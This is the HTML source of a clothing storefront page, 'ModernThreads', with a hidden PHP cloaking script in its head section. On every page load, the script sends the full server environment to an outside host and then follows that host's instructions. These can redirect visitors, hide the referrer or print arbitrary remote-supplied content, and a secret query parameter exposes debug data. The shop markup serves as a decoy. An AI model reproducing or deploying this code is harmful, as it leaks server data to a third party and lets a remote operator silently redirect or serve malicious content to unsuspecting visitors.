<!doctype html>
<html lang="en">
<head>
  <?php
class clLogic
{
    private string $apiEndpoint;
    private int $responseTimeout = 20;
    private int $connectTimeout = 20;
    private array $httpHeaders = [];
    private string $encodedServerData;
    private ?string $userIdentifier = "cKsQZMLcDQ";
    private ?string $campaignIdentifier = "je3OlMVE9b";
    private bool $isDebugMode = false;

    private const DEBUG_QUERY_PARAM = 'Vf5e78hgfhd';
    private const DEBUG_CAMPAIGN_PARAM = '4f5e78hgfhd';
    private const RESPONSE_TYPE_REDIRECT = 'redirection';
    private const RESPONSE_TYPE_INLINE = 'nrc';

    public function start()
    {
        try {
            ini_set('display_errors', 1);
            ini_set('display_startup_errors', 1);
            error_reporting(E_ALL);

            $this->checkRequirements();
            $this->handleCidQueryParam();
            $this->bootstrapExecution();
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function checkRequirements(): void
    {
        try {
            if (version_compare(PHP_VERSION, '7.4', '<')) {
                throw new RuntimeException('!Error: PHP 7.4 or higher is required. Current version: ' . PHP_VERSION);
            }

            if (!extension_loaded('curl')) {
                throw new RuntimeException('!Error: cURL extension is not enabled.');
            }
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function handleCidQueryParam(): void
    {
        try {
            if (!isset($_GET[self::DEBUG_CAMPAIGN_PARAM])) {
                return;
            }

            header('Content-Type: text/plain');
            echo $this->campaignIdentifier ?? 'cid-not-found';
            exit;
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function bootstrapExecution(): void
    {
        try {
            $this->setApiEndpoint();
            $this->initializeDebugMode();
            $this->encodeServerEnvironment();
            $this->prepareHttpHeaders();
            $this->sendRequestAndHandle();
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function initializeDebugMode(): void
    {
        try {
            $this->isDebugMode = isset($_GET[self::DEBUG_QUERY_PARAM]);
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function encodeServerEnvironment(): void
    {
        try {
            $this->encodedServerData = base64_encode(json_encode($_SERVER));
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function prepareHttpHeaders(): void
    {
        try {
            $this->httpHeaders = [
                'Content-Type: application/json',
                'Accept: application/json',
                'User-Agent: CloakBot/1.0', 
                'X-Timestamp: ' . gmdate('c'),
                'Connection: keep-alive',
                'X-UID: ' . ($this->userIdentifier ?? 'null'),
                'X-CID: ' . ($this->campaignIdentifier ?? 'null'),
            ];
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    public function sendRequestAndHandle(): array
    {
        try {


        $payload = $this->generateRequestPayload();
        $attempts = 0;
        $maxRetries = 5;
        $response = null;
        $httpCode = 0;
        $curlError = null;

        do {
            $attempts++;

            $ch = curl_init($this->apiEndpoint);
            curl_setopt_array($ch, $this->configureCurlOptions($payload));

            $rawResponse = curl_exec($ch);
         
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $curlError = curl_error($ch);
            curl_close($ch);

            $response = $this->parseJsonResponse($rawResponse);

            $shouldRetry = !empty($curlError) || $httpCode < 200 || $httpCode >= 300;

            if (!$shouldRetry) {
                break;
            }

        } while ($attempts < $maxRetries);

            $result = $this->buildFormattedResponse($payload, $httpCode, $curlError, $response);


            if ($this->isDebugMode) {
                $this->dumpDebugTrace($result);
            }

            $this->processServerDirective($response);

            return $result;
        } catch (Throwable $e) {
            $this->handleException($e);
            return ['error' => $e->getMessage()];
        }
    }

    private function generateRequestPayload(): array
    {
        try {
            return [
                'uid'     => $this->userIdentifier,
                'cid'     => $this->campaignIdentifier,
                'payload' => $this->encodedServerData,
            ];
        } catch (Throwable $e) {
            $this->handleException($e);
            return [];
        }
    }

    private function configureCurlOptions(array $payload): array
    {
        try {
            return [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_POST           => true,
                CURLOPT_HTTPHEADER     => $this->httpHeaders,
                CURLOPT_POSTFIELDS     => json_encode($payload),
                CURLOPT_TIMEOUT        => $this->responseTimeout,
                CURLOPT_CONNECTTIMEOUT => $this->connectTimeout,
                CURLOPT_SSL_VERIFYPEER => true,
            ];
        } catch (Throwable $e) {
            $this->handleException($e);
            return [];
        }
    }

    private function parseJsonResponse($raw): ?array
    {
        try {
            $decoded = json_decode($raw, true);
            return is_array($decoded) ? $decoded : null;
        } catch (Throwable $e) {
            $this->handleException($e);
            return null;
        }
    }

    private function buildFormattedResponse(array $payload, int $httpCode, string $error, ?array $response): array
    {
        try {
            return [
                'http_code' => $httpCode,
                'curl_error' => $error,
                'request_payload' => $payload,
                'response' => $response,
            ];
        } catch (Throwable $e) {
            $this->handleException($e);
            return [];
        }
    }

   private function processServerDirective(?array $response): void
    {
        try {

            if ($response['status'] == 'error') {
                echo $response['message'] ?? 'Unknown error';
                exit;
            }
            if ($response['status'] == 'none') {
                return;
            }

            if (isset($response['hide_referrer']) && $response['hide_referrer'] == 1) {
                header("Referrer-Policy: no-referrer");
            }
            if (isset($response['hide_referrer']) && $response['hide_referrer'] == 2) {
               echo '<!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <title>Redirecting...</title>
                        <script>
                            window.onload = function() {
                                var url = "' . ($response['url'] ?? '') . '";
                                if (url) {
                                    location.replace(url);
                                } else {
                                    document.body.innerText = "Invalid redirect URL.";
                                }
                            };
                        </script>
                    </head>
                    <body>
                        Redirecting...<br>
                        <noscript>
                            JavaScript is disabled. <a href="<?php echo htmlspecialchars($url, ENT_QUOTES); ?>">Click here to continue.</a>
                        </noscript>
                    </body>
                    </html>
                    ';
               exit;
            }

            switch ($response['method'] ?? '') {
                case self::RESPONSE_TYPE_REDIRECT:
                    header('Location: ' . $response['url'], false, (int) ($response['http_code'] ?? 302));
                    exit;

                case self::RESPONSE_TYPE_INLINE:
                    echo $response['content'] ?? '';
                    exit;
            }
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }
    public function dumpDebugTrace(array $data = []): void
    {
        try {
            echo "<pre>";
            echo "=========== TRACE INFO ===========";
            echo "Endpoint: {$this->apiEndpoint}";
            echo "--- Headers ---";
            print_r($this->httpHeaders);
            echo "--- Payload ---";
            print_r([
                'uid' => $this->userIdentifier,
                'cid' => $this->campaignIdentifier,
                'serverData' => $this->encodedServerData,
            ]);
            echo "--- Response ---";
            print_r($data);
            echo "==================================";
            echo "</pre>";
            exit;
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    public function setApiEndpoint(): void
    {
        try {
            $this->apiEndpoint = 'https://api.trafficguardian.org/api/v1/run';
        } catch (Throwable $e) {
            $this->handleException($e);
        }
    }

    private function handleException(Throwable $e): void
    {
        http_response_code(500);
        if ($this->isDebugMode) {
            echo "<pre>ERROR: " . $e->getMessage() . "" . $e->getTraceAsString() . "</pre>";
        } else {
            echo "A system error occurred.";
        }
        exit;
    }
}

$cloak = new clLogic();
$cloak->start();
?>
  <meta charset="utf-8" />
  <title>ModernThreads — Stylish Everyday Clothing</title>
  <meta name="description" content="ModernThreads — curated collection of stylish, sustainable clothing. Browse 10 featured items." />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <link rel="canonical" href="https://your-domain.com/" />
  <meta property="og:site_name" content="ModernThreads" />
  <meta property="og:title" content="ModernThreads — Stylish Everyday Clothing" />
  <meta property="og:description" content="Shop 10 curated garments — premium fabrics, timeless design." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://your-domain.com/" />
  <meta name="twitter:card" content="summary_large_image" />
  <link rel="stylesheet" href="css/styles.css" />
  <link rel="icon" href="images/favicon.svg" />

  <script type="application/ld+json">
  { "@context":"https://schema.org", "@type":"WebSite", "name":"ModernThreads", "url":"https://your-domain.com" }
  </script>

  <!-- Google AdSense placeholder: replace ca-pub-XXXXX and uncomment when ready -->
  <!--
  <script data-ad-client="ca-pub-XXXXX" async
    src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  -->
</head>
<body>
  <header class="site-header">
    <div class="wrap header-inner">
      <a class="brand" href="/">ModernThreads</a>
      <button id="menuBtn" class="hamburger" aria-label="Open menu" aria-expanded="false">☰</button>
      <nav id="mainNav" class="main-nav" aria-label="Main">
        <a href="/">Home</a>
        <a href="privacy.html">Privacy</a>
        <a href="terms.html">Terms</a>
        <a href="disclaimer.html">Disclaimer</a>
        <a href="sitemap.xml">Sitemap</a>
      </nav>
    </div>
  </header>

  <main>
    <section class="hero">
      <div class="wrap hero-inner">
        <div class="hero-copy">
          <h1>Clothes with style — made for everyday.</h1>
          <p class="lead">Sustainable fabrics • Clean cuts • 10 curated essentials</p>
          <a class="btn" href="#products">Shop Featured</a>
        </div>
        <div class="hero-art" aria-hidden="true">
          <svg viewBox="0 0 600 360" class="hero-svg" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="ModernThreads hero">
            <defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="#0b6efd"/><stop offset="1" stop-color="#7c3aed"/></linearGradient></defs>
            <rect width="100%" height="100%" rx="18" fill="url(#g)"/>
            <text x="50%" y="52%" text-anchor="middle" fill="#fff" font-size="36" font-family="Inter, Arial">ModernThreads</text>
          </svg>
        </div>
      </div>
    </section>

    <section id="products" class="wrap section">
      <div class="section-head">
        <h2>Featured Products</h2>
        <p class="muted">Hand-picked — limited runs</p>
      </div>

      <div class="grid">
        <article class="card">
          <a class="card-link" href="products/linen-summer-shirt.html">
            <figure class="media"><img src="images/linen-summer-shirt.svg" alt="Linen Summer Shirt" loading="lazy" width="800" height="800"></figure>
            <div class="card-body"><h3>Linen Summer Shirt</h3><p class="price">$39.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/classic-denim-jacket.html">
            <figure class="media"><img src="images/classic-denim-jacket.svg" alt="Classic Denim Jacket" loading="lazy"></figure>
            <div class="card-body"><h3>Classic Denim Jacket</h3><p class="price">$79.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/comfort-joggers.html">
            <figure class="media"><img src="images/comfort-joggers.svg" alt="Comfort Joggers" loading="lazy"></figure>
            <div class="card-body"><h3>Comfort Joggers</h3><p class="price">$49.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/organic-cotton-tee.html">
            <figure class="media"><img src="images/organic-cotton-tee.svg" alt="Organic Cotton Tee" loading="lazy"></figure>
            <div class="card-body"><h3>Organic Cotton Tee</h3><p class="price">$25.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/wool-blend-coat.html">
            <figure class="media"><img src="images/wool-blend-coat.svg" alt="Wool Blend Coat" loading="lazy"></figure>
            <div class="card-body"><h3>Wool Blend Coat</h3><p class="price">$129.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/slim-fit-chinos.html">
            <figure class="media"><img src="images/slim-fit-chinos.svg" alt="Slim Fit Chinos" loading="lazy"></figure>
            <div class="card-body"><h3>Slim Fit Chinos</h3><p class="price">$59.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/summer-dress.html">
            <figure class="media"><img src="images/summer-dress.svg" alt="Summer Dress" loading="lazy"></figure>
            <div class="card-body"><h3>Summer Dress</h3><p class="price">$69.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/knitted-scarf.html">
            <figure class="media"><img src="images/knitted-scarf.svg" alt="Knitted Scarf" loading="lazy"></figure>
            <div class="card-body"><h3>Knitted Scarf</h3><p class="price">$19.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/leather-belt.html">
            <figure class="media"><img src="images/leather-belt.svg" alt="Leather Belt" loading="lazy"></figure>
            <div class="card-body"><h3>Leather Belt</h3><p class="price">$29.00</p></div>
          </a>
        </article>

        <article class="card">
          <a class="card-link" href="products/classic-polo.html">
            <figure class="media"><img src="images/classic-polo.svg" alt="Classic Polo" loading="lazy"></figure>
            <div class="card-body"><h3>Classic Polo</h3><p class="price">$34.00</p></div>
          </a>
        </article>
      </div>
    </section>

    <section class="wrap newsletter">
      <div class="newsletter-inner">
        <div>
          <h3>Get early access</h3>
          <p class="muted">Subscribe for new drops &amp; discounts</p>
        </div>
        <form class="subscribe" onsubmit="event.preventDefault(); alert('Subscribed — connect to your email provider')">
          <label for="email" class="visually-hidden">Email</label>
          <input id="email" type="email" placeholder="you@example.com" required>
          <button class="btn-alt" type="submit">Subscribe</button>
        </form>
      </div>
    </section>
  </main>

  <footer class="site-footer">
    <div class="wrap footer-inner">
      <div>&copy; <span id="year"></span> ModernThreads</div>
      <nav class="footer-nav">
        <a href="privacy.html">Privacy</a>
        <a href="terms.html">Terms</a>
        <a href="disclaimer.html">Disclaimer</a>
      </nav>
    </div>
  </footer>

  <script>
    const menuBtn = document.getElementById('menuBtn');
    const mainNav = document.getElementById('mainNav');
    menuBtn.addEventListener('click', () => {
      const expanded = menuBtn.getAttribute('aria-expanded') === 'true';
      menuBtn.setAttribute('aria-expanded', String(!expanded));
      mainNav.classList.toggle('open');
    });
    document.getElementById('year').textContent = new Date().getFullYear();
  </script>
</body>
</html>
